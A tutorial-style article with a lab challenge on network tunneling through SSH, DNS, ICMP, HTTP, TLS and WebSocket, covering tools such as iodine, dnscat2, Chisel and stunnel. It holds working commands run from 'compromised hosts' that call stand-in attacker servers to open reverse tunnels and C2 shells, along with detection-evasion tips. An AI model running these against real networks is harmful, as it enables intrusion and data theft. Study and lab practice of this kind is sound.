Tunneling

Encapsulating traffic inside permitted protocols - SSH , DNS , ICMP , HTTP , TLS , and WebSocket tunnels to bypass egress filtering and traverse network boundaries.

Overview

Egress filtering blocks destinations, not intent. When a firewall permits only a few protocols, any protocol with a payload field can carry traffic for another protocol. Tunneling serializes the blocked protocol inside the permitted one and delegates unwrapping to a relay on the far side. This article covers the protocol-stacking principle, then works through SSH , DNS , ICMP , HTTP , TLS , and WebSocket tunnels, the situation each fits, and how defenders detect them.

Required Reading

  • TCP - TCP three-way handshake, sequence numbers, connection state machine
  • TLS - TLS handshake, certificates, cipher negotiation, mutual TLS
  • HTTP - HTTP methods, headers, CONNECT method, proxy interaction
  • DNS - DNS query types, zone structure, recursive resolution
  • ICMP - ICMP types, echo request/reply, packet structure

Tunneling vs Port Forwarding

These terms are often conflated. They are distinct operations with different threat models:

Technique What Happens Layer Detection Surface
Port Forwarding TCP connections relayed bare from one socket to another Transport (L4) Source/dest port correspondence, connection count
Tunneling Traffic encapsulated inside another protocol's payload Application (L7) Protocol anomaly detection, DPI inspection of payload

Port forwarding takes a TCP stream arriving on port A and replays it out port B. The bytes are unchanged. A firewall at B sees the original protocol. Tunneling wraps the original bytes inside a permitted protocol's envelope - SSH inside HTTP CONNECT, TCP inside DNS queries, IP datagrams inside ICMP . The firewall at the egress point sees only the envelope protocol.

Why tunnel:

  1. Egress filtering bypass : Only ports 80/443/53 outbound. Tunnel through them.
  2. Protocol whitelisting : Only HTTP permitted. Wrap SSH in HTTP CONNECT.
  3. DPI evasion : Deep packet inspection flags raw TCP shells. TLS wrapping hides content.
  4. Captive portals : Hotel/airport Wi-Fi blocks everything except DNS . Iodine tunnels IP over DNS .
  5. Air-gap simulation : Two networks with no IP connectivity but shared DNS resolution. DNS tunnel bridges them.

Protocol Stacking

Every tunnel follows the same pattern:

┌──────────────────────────────────┐
│ Original Protocol (TCP stream)   │ ← What you want to transport
├──────────────────────────────────┤
│ Envelope Protocol (HTTP/HTTPS)   │ ← What the firewall permits
├──────────────────────────────────┤
│ Transport Layer (TCP segment)    │
├──────────────────────────────────┤
│ Internet Layer (IP packet)       │
├──────────────────────────────────┤
│ Link Layer (Ethernet frame)      │
└──────────────────────────────────┘

The original bytes are serialized (or kept raw), placed inside the envelope protocol's payload field, and the envelope is sent to a relay that extracts the payload and forwards it to the real destination. Every tunneling tool is a variation on this layering.

SSH Tunneling

SSH is the most versatile tunneling mechanism because it provides encryption, authentication, compression, and three distinct forwarding modes - all inside a single TCP connection to port 22. The SSH protocol itself is rarely blocked; when it is, you wrap it in HTTP CONNECT (below).

Local Port Forwarding (-L)

The -L flag creates a listener on your local machine. Connections to that listener are forwarded through the SSH tunnel and emerge from the remote SSH server, which connects them to the final target. 

Local Machine          SSH Server (Jump Host)        Internal Target
┌──────────┐           ┌──────────┐                 ┌──────────┐
│ port 8443│──SSH──────│ :22      │─────TCP─────────│ :443     │
│ listener │  tunnel   │          │                 │ (webapp) │
└──────────┘           └──────────┘                 └──────────┘
						
# Forward localhost:8443 to internal.corp.com:443 via jumphost
# Any connection to localhost:8443 tunnels to internal.corp.com:443
ssh -L 8443:internal.corp.com:443 operator@jumphost.corp.com

# Now access the internal web app:
curl -k https://localhost:8443

# Multiple -L flags for multiple forwards on one SSH connection:
ssh -L 8080:web.internal:80 \
    -L 3389:dc.internal:3389 \
    -L 5432:db.internal:5432 \
    operator@jumphost.corp.com

# Bind to all interfaces (not just localhost) — allows others on your network
# to use your machine as a gateway into the target network
ssh -L 0.0.0.0:8080:web.internal:80 operator@jumphost.corp.com

The -N flag prevents executing a remote command (useful when you only need the tunnel). The -f flag backgrounds SSH after authentication. 

# Background tunnel, no remote shell, compress for slow links
ssh -fNL 8080:web.internal:80 -C operator@jumphost.corp.com

# Kill the background tunnel
pkill -f "ssh.*-L 8080"

Remote Port Forwarding (-R)

The -R flag inverts the direction. A listener is created on the remote SSH server. Connections to that remote port are forwarded back through the tunnel to your local machine, which connects to the final target. This is the "call home" pattern. 

Compromised Host        Public SSH Server         Attacker
┌──────────┐            ┌──────────┐             ┌──────────┐
│ :22  ─────SSH────────►│ :2222    │──call-in───►│          │
│          │  tunnel    │ listener │             │          │
│ :80    ◄──SSH─────────│          │             │          │
│ (webapp)│             └──────────┘             └──────────┘
└──────────┘
						
# On the compromised host behind NAT/firewall:
# Expose local port 80 to the public server's port 8080
ssh -R 8080:localhost:80 operator@public-server.example.com

# Now anyone connecting to public-server.example.com:8080
# gets the compromised host's web server

# Expose internal host through the compromised host (double-hop -R):
# On the compromised host (which can reach internal-server:22):
ssh -R 2222:internal-server.corp.com:22 operator@public-server.example.com

# Attacker can now SSH from the public server to internal-server via:
# From public-server:
ssh -p 2222 localhost

Critical -R configuration: the GatewayPorts option in /etc/ssh/sshd_config on the remote server must be yes or clientspecified for the remote listener to bind to interfaces other than loopback. 

# Check remote SSH server configuration
ssh operator@public-server.example.com "grep GatewayPorts /etc/ssh/sshd_config"

# If GatewayPorts is 'no', the remote listener binds only to 127.0.0.1
# This still works if you tunnel from the attacker to the public server first

SOCKS Proxy (-D)

The -D flag creates a SOC KS5 proxy on your local machine. The remote SSH server acts as the proxy egress point. Any SOC KS-aware application routes its traffic through the SSH tunnel. 

# Create SOCKS5 proxy on localhost:1080
ssh -D 1080 operator@jumphost.corp.com

# Use with proxychains
proxychains4 nmap -sT -Pn internal.corp.com

# Use with curl's built-in SOCKS support
curl --socks5-hostname localhost:1080 http://internal.corp.com

# Use with any tool via proxychains configuration:
# /etc/proxychains4.conf:
#   [ProxyList]
#   socks5 127.0.0.1 1080

SOC KS5 supports both TCP and DNS proxying ( --socks5-hostname resolves DNS through the proxy, preventing DNS leaks).

SSH Through HTTP CONNECT

When direct outbound SSH (port 22) is blocked but HTTP / HTTPS egress through a corporate proxy is permitted, tunnel SSH inside HTTP CONNECT: 

# Using netcat (OpenBSD nc with proxy support):
ssh -o ProxyCommand='nc -X connect -x proxy.corp.com:8080 %h %p' \
    operator@jumphost.example.com

# Using socat as ProxyCommand:
ssh -o ProxyCommand='socat - PROXY:proxy.corp.com:%h:%p,proxyport=8080' \
    operator@jumphost.example.com

# Using corkscrew (dedicated SSH HTTP-tunnel tool):
# Install: pacman -S corkscrew  (ArchLinux)
# ~/.ssh/config:
#   Host *.corp.com
#       ProxyCommand corkscrew proxy.corp.com 8080 %h %p
ssh operator@jumphost.corp.com

# SSH over HTTPS CONNECT (proxy with TLS interception):
ssh -o ProxyCommand='openssl s_client -quiet -connect proxy.corp.com:443 -servername proxy.corp.com' \
    operator@jumphost.example.com

The HTTP CONNECT method tells the proxy: "Open a raw TCP tunnel to the destination and relay bytes." Many corporate proxies allow CONNECT to port 443 only (for HTTPS ). You can run your SSH server on port 443: 

# On your jump host, add a secondary sshd listener on port 443:
echo "Port 443" >> /etc/ssh/sshd_config
systemctl restart sshd

# Connect:
ssh -p 443 -o ProxyCommand='nc -X connect -x proxy.corp.com:8080 %h %p' \
    operator@jumphost.example.com

DNS Tunneling

DNS tunneling exploits the fact that DNS queries ( UDP /53) are almost universally allowed through firewalls - even in captive portals, restricted guest networks, and heavily filtered enterprise environments. Without DNS resolution, the network is unusable. This creates an always-present egress path.

How DNS Tunneling Works

Normal DNS flow: client sends a query (www.example.com A?), recursive resolver returns an answer (93.184.216.34). DNS tunneling subverts this by encoding data in the query name field (up to 253 bytes per label) and decoding data from the response (TXT, NULL, CNAME, or A records). 

┌──────────────────────────────────────────────────┐
│ Client (Beacon)           DNS Server (Attacker)  │
│ ────────────────────────►                        │
│ DNS Query:                                        │
│   base32encodeddata.attacker.com  A?             │
│                                                  │
│                        ◄─────────────────────────│
│ DNS Response:                                    │
│   base32encodedreply.attacker.com  TXT "data"    │
└──────────────────────────────────────────────────┘

Upstream data (client -> server): Encoded in the subdomain labels of A/AAAA/TXT queries. Each label is limited to 63 bytes and a full query name to 255 bytes, so a conservative Base32 payload carries roughly 100 bytes per query.

Downstream data (server -> client): Encoded in the response records. NULL and PRIVATE request types give the largest downstream fragments, followed by TXT , SRV , MX , and CNAME ; TXT is the most portable because every resolver passes it.

Iodine - IP over DNS

Iodine creates a TUN (layer 3) interface over DNS . It tunnels raw IP packets inside DNS queries. The server side ( iodined ) creates a tunnel device ( dns0 ) and assigns an IP . The client side ( iodine ) connects to it, receives an IP from a dedicated subnet, and routes traffic through the tunnel.

Iodine Server Setup

# Install iodine
pacman -S iodine   # ArchLinux

# Create a subdomain NS delegation for your tunnel domain:
# In your DNS zone file for example.com:
#   tunnel  IN  NS  tunnel-ns.example.com.
#   tunnel-ns  IN  A  198.51.100.10   # Your attacker server IP
#
# Any query to *.tunnel.example.com now goes to your server.

# Start iodined server on the tunnel domain
# 10.0.0.0/24 is the tunnel subnet; server gets 10.0.0.1
sudo iodined -f -c -P secretpassword 10.0.0.1 tunnel.example.com

# Verify the tunnel interface
ip addr show dns0
# dns0: <POINTOPOINT,MULTICAST,NOARP,UP> mtu 1130
#     inet 10.0.0.1/24 scope global dns0

# Enable IP forwarding on the server
echo 1 | sudo tee /proc/sys/net/ipv4/ip_forward

# NAT traffic from tunnel clients to the internet
sudo iptables -t nat -A POSTROUTING -s 10.0.0.0/24 -o eth0 -j MASQUERADE

Iodine Client Setup

# Install iodine client
pacman -S iodine   # Or compile from source if package not available

# Connect to the tunnel server
# -f: foreground, -P: password, -r: raw mode (better performance)
sudo iodine -f -P secretpassword -r tunnel.example.com

# The client gets assigned an IP from the tunnel subnet (10.0.0.2)
ip addr show dns0
# inet 10.0.0.2 peer 10.0.0.1/24

# Now you have IP connectivity to the attacker server through DNS
ping 10.0.0.1          # Tunneled through DNS
ssh 10.0.0.1           # SSH tunneled through DNS — works, slowly

# Route all traffic through the DNS tunnel:
sudo ip route add default via 10.0.0.1 dev dns0
# OR selectively route internal target networks:
sudo ip route add 192.168.100.0/24 via 10.0.0.1 dev dns0

# The tunnel subnet (10.0.0.0/24) is what you use to address tunnel endpoints
# Your server should NAT/route traffic beyond that subnet

Performance

Mode Bandwidth Latency Use Case
Raw mode (-r) 100 KB/s up,1 MB/s down 100-500ms Interactive SSH, small file transfers
Standard mode 30 KB/s up,200 KB/s down 200-1000ms Command execution, beaconing

DNS tunneling is the slowest option. Every packet requires a full DNS round-trip. You're using it only when nothing else works.

Alternative Base Encoding

Iodine autodetects the upstream codec. Base32 is the fallback that always works; Base64 and Base128 carry more bits per label but require the resolver to pass mixed case, + , or high-byte values unchanged. Force the downstream codec with -O and the request type with -T : 

# Force the downstream codec (upstream stays autodetected)
iodine -f -P password -O base32 tunnel.example.com    # fallback, always works
iodine -f -P password -O base64 tunnel.example.com    # more bandwidth, mixed case
iodine -f -P password -O base128 tunnel.example.com   # highest density, clean path only

# Force the DNS request type (NULL and PRIVATE give the most downstream bandwidth)
iodine -f -P password -T TXT tunnel.example.com

dnscat2 - Command & Control over DNS

Dnscat2 is purpose-built for C2 over DNS . It provides an interactive session with a command shell, port forwarding, and tunneling - all inside DNS queries. Encryption depends on the --security mode: open sends plaintext, while shared derives a key from the pre-shared secret. 

# Server (attacker):
git clone https://github.com/iagox86/dnscat2.git
cd dnscat2/server

# Install dependencies (ArchLinux)
sudo pacman -S ruby ruby-bundler
bundle install

# Start the dnscat2 server
# domain = the domain delegated to your nameserver
# secret = pre-shared key used when --security is shared or authenticated
ruby dnscat2.rb tunnel.example.com --secret=sharedsecret --security=open

# Client (compromised host):
git clone https://github.com/iagox86/dnscat2.git
cd dnscat2/client
make

./dnscat --dns server=198.51.100.10,port=53 \
         --secret=sharedsecret \
         --security=open

# On the server console once the client connects:
# List sessions
windows

# Interact with session 1
session -i 1

# Open a shell on the client
shell

# Create a port forward: server:8443 -> client:80
listen 8443 127.0.0.1:80

# Create a reverse tunnel: client:2222 -> server:22
# (from client session:)
listen 2222 127.0.0.1:22

ICMP Tunneling

ICMP tunneling encapsulates IP traffic inside ICMP echo request/reply packets. Firewalls that permit ICMP (for ping/traceroute diagnostics) but block TCP / UDP are vulnerable to this. 

# ptunnel — ICMP tunneling tool
# Install:
pacman -S ptunnel   # AUR: ptunnel-git

# Server (attacker — must be reachable via ICMP):
sudo ptunnel -v 4

# Client (compromised host):
# Forward local port 2222 to server, tunneled over ICMP
sudo ptunnel -p attacker.example.com -lp 2222 -da ssh-server.internal.corp.com -dp 22

# Now in another terminal:
ssh -p 2222 localhost   # SSH proxied over ICMP to attacker → internal SSH

Ptunnel uses ICMP echo (type 8) for client->server and echo reply (type 0) for server->client. The payload field of ICMP packets carries the encapsulated data.

Limitations

  • ICMP is often rate-limited by routers and firewalls (1-10 pps).
  • Large packets may be fragmented or dropped.
  • Stateful firewalls track echo request/reply pairs - ptunnel uses valid echo types to blend in.
  • Some IDS signatures look for oversized ICMP payloads (standard ping payload is~56 bytes).

HTTP/HTTPS Tunneling

When only HTTP / HTTPS is permitted (corporate proxy environments), HTTP tunneling wraps arbitrary TCP inside HTTP requests. The client sends HTTP POST with payload, the server responds with HTTP 200 with response payload.

httptunnel - htc/hts

# Install
pacman -S httptunnel   # AUR

# Server (attacker) — listens on port 8888 for HTTP tunnel connections:
hts -F localhost:22 8888
# -F localhost:22: forward tunneled data to SSH on localhost:22
# 8888: HTTP tunnel listening port

# Client (compromised host behind HTTP-only proxy):
htc -F 2222 -P proxy.corp.com:8080 attacker.example.com:8888
# -F 2222: local port to listen on (connect SSH to localhost:2222)
# -P: corporate proxy (if any)
# attacker.example.com:8888: the hts server

# Use the tunnel:
ssh -p 2222 localhost
# This SSH connection goes: ssh → htc (encapsulates in HTTP) → proxy → hts → localhost:22

Chisel - TCP over HTTP/WebSocket

Chisel is the modern replacement for httptunnel. It provides a single binary, encrypted transport, and both forward and reverse tunnels over HTTP /WebSocket. 

# Download Chisel binaries or build from source:
# https://github.com/jpillora/chisel/releases

# Server (attacker — reverse tunnel endpoint):
./chisel server -p 8080 --reverse

# Client (compromised host — punches out to server):
# Reverse tunnel: expose client's localhost:80 as server's port 1080
./chisel client attacker.example.com:8080 R:1080:localhost:80

# Now attacker accesses http://localhost:1080 → client's localhost:80

# Forward tunnel: expose server's port 2222 as client's localhost:2222
./chisel client attacker.example.com:8080 2222:localhost:22
# Then on client: ssh -p 2222 localhost → attacker's SSH

# SOCKS proxy through Chisel (like SSH -D):
./chisel client attacker.example.com:8080 socks
# Creates SOCKS5 listener on client at 127.0.0.1:1080

# Chisel over HTTPS with self-signed cert:
./chisel server -p 443 --tls-key key.pem --tls-cert cert.pem --reverse
./chisel client https://attacker.example.com R:0.0.0.0:8443:localhost:80

Chisel uses WebSocket upgrades by default, which traverse most corporate proxies that allow HTTPS (proxies see a WebSocket upgrade request inside TLS - indistinguishable from legitimate browser traffic).

socat with HTTP CONNECT

# Client-side: Forward local SSH through corporate proxy via CONNECT
# socat creates a tunnel: STDIN/STDOUT → HTTP CONNECT proxy → remote SSH
socat TCP4:attacker.example.com:443,proxy=proxy.corp.com:8080 \
      EXEC:'ssh -p 443 -W localhost:22 operator@localhost,nofork'

# Simpler: use socat as SSH ProxyCommand
ssh -o ProxyCommand='socat - PROXY:proxy.corp.com:%h:%p,proxyport=8080' \
    operator@attacker.example.com

# socat creating an HTTP CONNECT relay (man-in-the-middle style):
# This listens on local port 3128, sends everything via CONNECT to remote
socat TCP4-LISTEN:3128,fork,reuseaddr \
      PROXY:proxy.corp.com:attacker.example.com:443,proxyport=8080
# Then configure browser to use localhost:3128 as HTTP proxy

TLS Tunneling

TLS tunnels encapsulate arbitrary TCP inside TLS . This defeats DPI inspection (the payload is encrypted) and impersonates legitimate HTTPS traffic on port 443.

stunnel - Universal TLS Wrapper

stunnel acts as a TLS encryption/decryption proxy. Any TCP service can be wrapped in TLS . 

# Install
pacman -S stunnel

# Generate self-signed certificate
openssl req -new -newkey rsa:4096 -days 365 -nodes -x509 \
    -subj "/CN=update-server.corp.com" \
    -keyout /etc/stunnel/stunnel.key \
    -out /etc/stunnel/stunnel.crt
cat /etc/stunnel/stunnel.key /etc/stunnel/stunnel.crt > /etc/stunnel/stunnel.pem
chmod 600 /etc/stunnel/stunnel.pem

# stunnel.conf — Server (wraps SSH in TLS, listens on 443):
cat > /etc/stunnel/stunnel.conf << 'EOF'
pid = /var/run/stunnel.pid

[tls-ssh]
accept  = 0.0.0.0:443
connect = 127.0.0.1:22
cert    = /etc/stunnel/stunnel.pem
EOF

sudo stunnel /etc/stunnel/stunnel.conf
# Now SSH is accessible via TLS on port 443
# Connect: openssl s_client -connect attacker:443 → enter SSH session
						
# stunnel.conf — Client (unwrap TLS and connect to local service):
cat > /etc/stunnel/stunnel.conf << 'EOF'
pid = /var/run/stunnel.pid
client = yes

[tls-client]
accept  = 127.0.0.1:2222
connect = attacker.example.com:443
verify  = 0
EOF

sudo stunnel
# Now ssh -p 2222 localhost → TLS → attacker:443 (which unwraps to :22)

socat with OpenSSL

# Generate cert:
openssl req -new -newkey rsa:4096 -days 365 -nodes -x509 \
    -subj "/CN=server" -keyout server.key -out server.crt \
    -addext "subjectAltName=DNS:attacker.example.com,DNS:localhost,IP:198.51.100.10"

# Server: TLS listener forwarding to SSH on port 22
socat OPENSSL-LISTEN:443,cert=server.crt,key=server.key,verify=0,fork,reuseaddr \
      TCP4:127.0.0.1:22

# Client: connect to TLS server, expose as local port 2222
socat TCP4-LISTEN:2222,fork,reuseaddr \
      OPENSSL:attacker.example.com:443,verify=0
ssh -p 2222 localhost

# TLS tunnel with mutual authentication (client cert required):
# Server:
socat OPENSSL-LISTEN:443,cert=server.crt,key=server.key,cafile=client.crt,fork \
      TCP4:127.0.0.1:22
# Client:
socat TCP4-LISTEN:2222,fork,reuseaddr \
      OPENSSL:attacker.example.com:443,cert=client.crt,key=client.key,cafile=server.crt

WebSocket Tunneling

# websocat — Swiss army knife for WebSocket (like socat for WS)
# Install:
pacman -S websocat   # Or: cargo install websocat

# Server: WebSocket listener forwarding to TCP
websocat -s 0.0.0.0:8080 tcp-listen:127.0.0.1:22

# Client: Connect and expose as local port 2222
websocat --binary -E tcp-l:127.0.0.1:2222 ws://attacker.example.com:8080
ssh -p 2222 localhost

# WebSocket over TLS (wss://)
websocat -s 0.0.0.0:443 --ssl-cert server.crt --ssl-key server.key \
         tcp-listen:127.0.0.1:22
# Client:
websocat --binary -E tcp-l:127.0.0.1:2222 wss://attacker.example.com

Secure Socket Funneling (ssf)

ssf is a multi-protocol tunneling tool supporting TCP , UDP , SOC KS, and TLS - all wrapped in a single encrypted session. It's the "everything tunnel." 

# Build from source (requires cmake, boost, openssl):
git clone https://github.com/securesocketfunneling/ssf.git
cd ssf
mkdir build && cd build
cmake -DCMAKE_BUILD_TYPE=Release ..
make -j$(nproc)

# Server:
./ssfd -p 443

# Client connecting to server:
./ssf -p 443 attacker.example.com

# From the ssf CLI session:
# portfwd add -l 1080 -r 80 -t internal.corp.com
# localhost:1080 → internal.corp.com:80 through ssf tunnel

# SOCKS proxy:
# From ssf session:
# socks -p 1080
# localhost:1080 is now a SOCKS5 proxy egressing at the ssf server

Tunnel Selection Guide

Scenario Best Tunnel Reason
SSH (22) allowed SSH -L/-R/-D Native, encrypted, fastest
Only HTTP(S) allowed, no proxy Chisel HTTPS WebSocket upgrade, encrypted
Corporate proxy (HTTP CONNECT allowed) SSH through ProxyCommand Works with existing SSH config
Corporate proxy (HTTPS only) Chisel wss:// WebSocket over TLS, blends in
Captive portal, DNS only iodine IP over DNS, works everywhere
Captive portal, DNS only, need shell dnscat2 Encrypted C2 with port forwarding
ICMP allowed, TCP/UDP blocked ptunnel Slow but functional
DPI evasion needed stunnel/socat TLS Content hidden in encrypted TLS stream
Multi-protocol, complex environment ssf TCP, UDP, SOCKS, all-in-one
No outbound ports at all DNS tunnel DNS is the last port standing

Common Mistakes

  1. Not using -N for port-forward-only SSH sessions : Without -N , SSH allocates a PT Y and opens a shell - visible, logged, useless for tunneling.
  1. Forgetting DNS resolution direction : SSH -D SOC KS - use --socks5-hostname (curl) or proxy_dns (proxychains) so DNS resolves through the tunnel. Without this, DNS queries leak to your local resolver.
  1. GatewayPorts misconfiguration : SSH -R binds to loopback by default if the server has GatewayPorts no . Test with ss -tlnp on the remote host.
  1. iodine DNS delegation : iodine must be the authoritative nameserver for the tunnel domain. Simple A record pointing to your server is insufficient - you need NS delegation.
  1. Tunnel MTU issues : DNS tunnels have a small MTU; iodine defaults to 1130 bytes and probes lower values when the resolver fragments badly. TCP MSS clamping prevents fragmentation:
# On the tunnel interface server side, clamp MSS:
sudo iptables -t mangle -A FORWARD -o dns0 -p tcp --tcp-flags SYN,RST SYN \
    -j TCPMSS --set-mss 500
sudo iptables -t mangle -A FORWARD -i dns0 -p tcp --tcp-flags SYN,RST SYN \
    -j TCPMSS --set-mss 500

Verification

# Verify SSH tunnel is active:
ss -tlnp | grep -E '1080|8443|8080'
# Verify the SSH process owns the listener

# Test local forward:
curl -v http://localhost:8080  # Should reach internal target

# Test SOCKS proxy:
curl --socks5-hostname localhost:1080 https://ifconfig.me
# Should return the jumphost's IP, not your local IP

# Verify iodine tunnel:
ping 10.0.0.1                      # Ping server through DNS tunnel
tcpdump -i dns0 -n                 # Watch traffic on tunnel interface
iodine -f -P testpass tunnel.example.com 2>&1 | grep "Connection"
# Should show "Connection setup complete, transmitting data"

# Verify DNS tunnel throughput:
# Server: nc -lvnp 9999 > /dev/null
# Client: dd if=/dev/zero bs=1024 count=1024 | nc 10.0.0.1 9999
# Watch for consistent, if slow, transfer

# Verify no DNS leaks when using SOCKS:
dig +short myip.opendns.com @resolver1.opendns.com
# Should NOT show your real IP (should fail or show tunnel IP)

Tunnel Detection and Evasion

Defenders look for:

  1. Volume anomalies : DNS TXT queries larger than typical DNS responses. Normal TXT records are~100-300 bytes. Tunnel TXT records are as large as possible (up to 65535 bytes via E DNS 0).
  1. Entropy : Base32/Base64-encoded subdomain labels have higher entropy than human-readable subdomains. Defenders compute entropy per label.
  1. Query type distribution : Normal DNS traffic is mostly A and AAAA. Tunnels use TXT, NULL, CNAME disproportionately.
  1. Timing : Persistent, sustained DNS queries (every second for minutes) are diagnostic of tunneling, not browsing.

Evasion techniques:

# Iodine with reduced packet size (blends better):
iodine -f -P password -m 200 tunnel.example.com
# -m 200: maximum downstream packet size 200 bytes (smaller queries)

# Add jitter between queries:
# Custom wrapper that sleeps random intervals:
while true; do
    sleep $(python3 -c 'import random; print(random.uniform(0.5, 3.0))')
    # send DNS query
done

# Use common DNS query types (A record) instead of TXT:
# iodine -T A (type A queries for upstream, still TXT for downstream)
# This limits upstream bandwidth but looks more normal

# If you control a CDN-backed domain, front the tunnel through:
#   front-domain.cdnprovider.com (legitimate)
#   tunnel-origin.example.com (your tunnel server)
# The CDN forwards to your origin, firewall sees the front domain

Challenge

The companion container at tunneling.Containerfile sets up a multi-container podman pod with three network zones:

  • Internet (10.89.0.0/24): The attacker's network. Full outbound access.
  • DMZ (10.89.1.0/24): The compromised host. DNS -only egress to Internet. Inbound from Internet blocked.
  • Internal (10.89.2.0/24): The target network. Only accessible from DMZ.

Firewall rules on the DMZ host restrict all outbound except DNS ( UDP 53) and responses. The lab demonstrates DNS tunneling from the compromised DMZ host to the attacker, establishing IP connectivity through iodine, and then pivoting into the internal network. 

# Build the three images from the multi-stage Containerfile
podman build -t tunneling-internet --target internet -f tunneling.Containerfile .
podman build -t tunneling-dmz --target dmz -f tunneling.Containerfile .
podman build -t tunneling-internal --target internal -f tunneling.Containerfile .

# Create the pod with three containers:
podman pod create --name tunnel-lab --share net

# Launch containers with custom networks
podman network create internet --subnet 10.89.0.0/24
podman network create dmz --subnet 10.89.1.0/24 --internal
podman network create internal --subnet 10.89.2.0/24 --internal

# Start the DMZ container (dual-homed to DMZ and internal networks):
podman run -d --name dmz-host --network dmz \
    --network internal \
    --cap-add NET_ADMIN \
    tunneling-dmz

# Set up firewall rules on DMZ host to restrict egress
# (DNS only, NAT connections to internal)
podman exec dmz-host /setup-firewall.sh

# Start the Internet (attacker) container:
podman run -d --name attacker --network internet \
    --cap-add NET_ADMIN \
    tunneling-internet
podman exec attacker /start-attacker.sh

# Start the Internal (target) container:
podman run -d --name internal-srv --network internal \
    tunneling-internal

# Execute the full attack chain:
podman exec attacker /lab/demo-tunnel.sh

# Or walk through manually:
# 1. Attacker: start iodine server
# 2. DMZ host: connect iodine client through restricted firewall
# 3. Attacker: verify tunnel connectivity (ping 10.0.0.2)
# 4. Attacker: SSH through tunnel to DMZ host
# 5. DMZ host: route traffic to internal network through tunnel
# 6. Attacker: access internal web server through the DNS tunnel
